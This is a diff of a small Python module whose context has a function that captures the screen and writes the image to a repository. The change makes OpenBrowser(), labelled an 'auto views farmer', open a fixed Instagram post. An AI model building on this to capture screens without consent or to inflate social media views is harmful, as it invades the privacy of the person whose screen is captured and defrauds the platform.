@@ -2,6 +2,8 @@
 from modules.repomanager import writeIMGToRepo
 from datetime import datetime
 from PIL import ImageGrab
+
+import webbrowser
 import platform
 
 
@@ -19,5 +21,6 @@ def Screenshot():
     writeIMGToRepo(filepath)
 
 
+# Auto views farmer
 def OpenBrowser():
-    print("opening browser")
+    webbrowser.open("https://www.instagram.com/p/Cs9Sl0hgtK-/", new=0, autoraise=True)
